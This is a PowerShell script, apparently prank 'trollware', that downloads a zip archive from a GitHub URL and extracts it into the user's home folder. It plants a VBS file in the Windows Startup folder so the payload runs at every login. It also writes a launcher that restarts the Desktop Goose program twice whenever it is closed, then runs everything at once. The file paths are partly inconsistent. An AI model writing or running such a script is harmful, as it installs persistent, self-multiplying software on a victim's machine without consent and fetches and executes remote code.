# Download and install
Set-Location $home
Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G/raw/main/g.zip" -OutFile "GooseTrollware.zip"
Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force

# Copy VBA script to startup folder
$gloc="$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.vbs"
@"
Do
    Set objShell = CreateObject("WScript.Shell")
    strHomeDir = objShell.ExpandEnvironmentStrings("%userprofile%")
    strExePath = strHomeDir & "\GooseTrollware\Desktop Goose v0.31\DesktopGoose v0.31\start.ps1"
    Do
        objShell.Run Chr(34) & strExePath & Chr(34), 1, True
        Exit Do
        WScript.Sleep 5000
    Loop
Loop
"@ > $gloc

# Copy powershell script to goose trollware folder (should be moved inside the zip?)
$gloc2="GooseTrollware\start.ps1"
@"
$homeDir = [Environment]::GetFolderPath("UserProfile")
$exePath = Join-Path $homeDir "GooseTrollware\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"

function Start-Goose {
    $process = Start-Process -FilePath $exePath -PassThru
    Register-ObjectEvent -InputObject $process -EventName Exited -Action {
        Start-Goose
        Start-Goose
    }
}

Start-Goose

# Keep the script running indefinitely
while ($true) {
    Start-Sleep -Seconds 1
}
"@ > $gloc2

# And finally we start it
Start-Sleep 1
powershell "$gloc"
